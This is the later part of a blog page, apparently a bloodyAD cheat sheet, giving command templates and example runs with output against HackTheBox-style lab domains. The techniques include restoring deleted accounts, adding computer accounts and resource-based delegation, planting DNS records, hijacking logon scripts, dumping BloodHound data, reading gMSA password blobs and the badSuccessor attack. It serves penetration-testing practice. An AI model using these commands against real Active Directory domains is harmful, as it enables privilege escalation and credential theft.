+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k set restore todd.wolfe</span><br><span class="line out">[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb</span><br></pre></td></tr></table></figure>
+
+<h3 id="Create-a-new-computer-account"><a href="#Create-a-new-computer-account" class="headerlink" title="Create a new computer account"></a>Create a new computer account</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add computer <span class="var">$computer_name</span> <span class="var">$computer_password</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host DC1.delegate.vl -d delegate.vl -u n.thompson -p &#x27;KALEB_2341&#x27; add computer meow &#x27;P@ssw0rd&#x27;</span><br><span class="line out">[+] meow created</span><br></pre></td></tr></table></figure>
+
+<h3 id="Add-Resource-Based-Constrained-Delegation"><a href="#Add-Resource-Based-Constrained-Delegation" class="headerlink" title="Add Resource Based Constrained Delegation"></a>Add Resource Based Constrained Delegation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add rbcd &#x27;DELEGATE_TO$&#x27; &#x27;DELEGATE_FROM$&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc2.domain.local -d domain.local -u &#x27;C.Carlssen&#x27; -k add rbcd svc_sql &#x27;meow$&#x27;</span><br><span class="line out">[!] No security descriptor has been returned, a new one will be created</span><br><span class="line out">[+] meow$ can now impersonate users on svc_sql via S4U2Proxy</span><br></pre></td></tr></table></figure>
+
+<h3 id="Register-a-DNS-Record"><a href="#Register-a-DNS-Record" class="headerlink" title="Register a DNS Record"></a>Register a DNS Record</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add dnsRecord <span class="var">$record_name</span> <span class="var">$attacker_ip</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord SQL07 10.10.14.61</span><br><span class="line out">[+] SQL07 has been successfully added</span><br></pre></td></tr></table></figure>
+
+<h3 id="Overwrite-the-logon-script-path"><a href="#Overwrite-the-logon-script-path" class="headerlink" title="Overwrite the logon script path"></a>Overwrite the logon script path</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$DN</span> scriptPath -v <span class="var">$file</span></span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host garfield.htb -d garfield.htb -u j.arbuckle -p &#x27;Th1sD4mnC4t!@1978&#x27; set object &#x27;CN=Liz Wilson,CN=Users,DC=garfield,DC=htb&#x27; scriptPath -v &#x27;printerDetect.bat&#x27;</span><br><span class="line out">[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb&#x27;s scriptPath has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Collect-Bloodhound-data"><a href="#Collect-Bloodhound-data" class="headerlink" title="Collect Bloodhound data"></a>Collect Bloodhound data</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get bloodhound</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host DC2.pong.htb -d pong.htb --dc-ip 192.168.2.2 -u c.roberts -k get bloodhound</span><br><span class="line out">[+] Connecting to LDAP server</span><br><span class="line out">[+] Connected to LDAP serrver</span><br><span class="line out">Dumping schema: 2it [00:00,  5.33it/s]</span><br><span class="line out">Generating lookuptable: 96it [00:00, 102.83it/s]</span><br><span class="line out">Dumping SDs:  99%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌ | 99/100 [00:09&lt;00:00,  9.98it/s]</span><br><span class="line out">Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00&lt;00:00,  3.66it/s]</span><br><span class="line out">Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 16/16 [00:00&lt;00:00, 112.13it/s]</span><br><span class="line out">Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00&lt;00:00, 21.41it/s]</span><br><span class="line out">Dumping groups: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 52/52 [00:00&lt;00:00, 328.41it/s]</span><br><span class="line out">Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3/3 [00:00&lt;00:00, 31.36it/s]</span><br><span class="line out">Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00&lt;00:00, 23.38it/s]</span><br><span class="line out">Dumping Containers: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00&lt;00:00, 99.91it/s]</span><br><span class="line out">[+] Bloodhound data saved to 20260426T192924_Bloodhound.zip</span><br><span class="line out">[+] Found 1 trusts</span><br></pre></td></tr></table></figure>
+
+<h3 id="Change-Group-Type-to-Domain-Local"><a href="#Change-Group-Type-to-Domain-Local" class="headerlink" title="Change Group Type to Domain Local"></a>Change Group Type to Domain Local</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> set object <span class="var">$group</span> groupType -v -2147483644</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host DC2.pong.htb -d pong.htb -u c.roberts -k set object &#x27;CN=gMSA Managers,CN=Users,DC=pong,DC=htb&#x27; groupType -v -2147483644</span><br><span class="line out">[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb&#x27;s groupType has been updated</span><br></pre></td></tr></table></figure>
+
+<h3 id="Get-the-msDS-ManagedPassword-blob"><a href="#Get-the-msDS-ManagedPassword-blob" class="headerlink" title="Get the msDS-ManagedPassword blob"></a>Get the msDS-ManagedPassword blob</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> get search --filter &#x27;(sAMAccountName=account_name$)&#x27; --attr &#x27;msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName&#x27; --raw</span><br></pre></td></tr></table></figure>
+<p><strong>Example:</strong></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>bloodyAD --host dc2.pong.htb -d pong.htb -u &#x27;c.roberts@ping.htb&#x27; -k get search --filter &#x27;(sAMAccountName=Pong_gMSA$)&#x27; --attr &#x27;msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName&#x27; --raw</span><br><span class="line out"></span><br><span class="line out">distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb</span><br><span class="line out">msDS-ManagedPassword: AQAAACQCAAAQABIBFAIcAnhZG1ix0PWawJDVD5CKMgZ7hrJ18mTj...[SNIP]</span><br><span class="line out">msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAbAEAAAIAAAAAAAAAM1Hudw9yHvOOVt4ob5...[SNIP]</span><br><span class="line out">sAMAccountName: Pong_gMSA$</span><br></pre></td></tr></table></figure>
+
+<h3 id="add-badSuccessor"><a href="#add-badSuccessor" class="headerlink" title="add badSuccessor"></a>add badSuccessor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="var">$dc</span> -d <span class="var">$domain</span> -u <span class="var">$username</span> -p <span class="var">$password</span> add badSuccessor <span class="var">$hostname</span> -t <span class="var">$target_DN</span> --ou <span class="var">$DMSA_object_OU</span> --prepatch</span><br></pre></td></tr></table></figure>
+<p>Example:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host 10.129.16.147 -d checkpoint.htb -u alex.turner -p &#x27;Checkpoint2024!&#x27; add badSuccessor pwnsvc -t &#x27;CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb&#x27; --ou &#x27;OU=Employees,DC=checkpoint,DC=htb&#x27; --prepatch</span><br></pre></td></tr></table></figure>
+
+<h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><ul>
+<li>Pass <code>-k</code> to use kerberos authentication.</li>
+<li>You can pass a user hash instead of a password using <code>-p :hash</code>.</li>
+<li>Specify format for <code>--password</code> or <code>-k &lt;keyfile&gt;</code> using <code>-f</code>, e.g. <code>-f rc4</code>.</li>
+</ul>
+<h3 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">https://github.com/CravateRouge/bloodyAD/wiki/User-Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/03/30/htb-rebound.html">https://0xdf.gitlab.io/2024/03/30/htb-rebound.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2025/04/26/htb-vintage.html">https://0xdf.gitlab.io/2025/04/26/htb-vintage.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/">https://www.thehacker.recipes/</a></li>
+</ul>
+<h3 id="Machines-To-Practice-HackTheBox"><a href="#Machines-To-Practice-HackTheBox" class="headerlink" title="Machines To Practice (HackTheBox)"></a>Machines To Practice (HackTheBox)</h3><ul>
+<li>Redelegate</li>
+<li>Vintage</li>
+<li>Infiltrator</li>
+<li>Rebound</li>
+<li>Absolute</li>
+<li>Certified</li>
+<li>TombWatcher</li>
+<li>Voleur</li>
+<li>PingPong</li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <section class="related">
+      <h2 class="year">related</h2>
+      <ul class="list">
+        
+        <li><time datetime="2024-11-19T18:47:00.000Z">2024-11-19</time><a href="/loaf/AD-ACLs-Cheatsheet/">AD ACLs Cheatsheet</a></li>
+        
+        <li><time datetime="2025-10-20T16:30:27.000Z">2025-10-20</time><a href="/loaf/AKTIVKATALOG-2-Hack-lu-CTF-2025/">AKTIVKATALOG 2 - Hack.lu CTF 2025</a></li>
+        
+        <li><time datetime="2024-08-18T22:34:29.000Z">2024-08-18</time><a href="/loaf/Reflection-Vulnlab/">Reflection - Vulnlab</a></li>
+        
+      </ul>
+    </section>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/loaf/Redelegate-Vulnlab/" rel="next"><small>← older</small>Redelegate - Vulnlab</a>
+      <a class="newer" href="/loaf/Abusing-Unconstrained-Delegation/" rel="prev"><small>newer →</small>Abusing Unconstrained Delegation</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  <div class="site-footer-inner">
+    <a class="perch" href="#" aria-label="back to top" title="back to top"><svg class="cat" viewBox="0 0 72 36" aria-hidden="true">
+  <path class="cat-tail" d="M11 32.5C4.5 33 2.4 28.5 3 22.5" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round"/>
+  <g fill="currentColor">
+    <path d="M9 36c-3.5 0-4.5-3-3.5-7 2-9.5 11-15 24-15h18c10 0 16 6 16 15v7Z"/>
+    <path d="M40.8 15.5 42.5 3.5l8.5 6.5ZM54.5 9.5l8-6 1.5 12Z"/>
+    <ellipse cx="52.3" cy="18.5" rx="12" ry="10.3"/>
+  </g>
+  <g class="cat-asleep" fill="none" stroke="var(--bg)" stroke-width="1.3" stroke-linecap="round">
+    <path d="M45.3 18.8q2.1 1.9 4.2 0M55.3 18.8q2.1 1.9 4.2 0"/>
+  </g>
+  <g class="cat-awake" fill="var(--bg)">
+    <ellipse cx="47.4" cy="18.6" rx="1.7" ry="2.1"/><ellipse cx="57.4" cy="18.6" rx="1.7" ry="2.1"/>
+  </g>
+  <path d="M51.3 22.3h2.2l-1.1 1.2Z" fill="#e58aa5"/>
+</svg>
+</a>
+    
+    <span>© 2023–2026 serioton</span>
+    <a href="/loaf/atom.xml">rss</a>
+  </div>
+</footer>
+
+
+<dialog class="search" data-index="/loaf/search.xml" aria-label="search">
+  <input type="search" placeholder="search posts…" autocomplete="off" spellcheck="false" aria-label="search posts">
+  <ol class="search-results"></ol>
+  <p class="search-note">type to search · ↑↓ to move · esc to close</p>
+</dialog>
+
+<script src="/loaf/js/loaf.js" defer></script>
+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="loaf",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
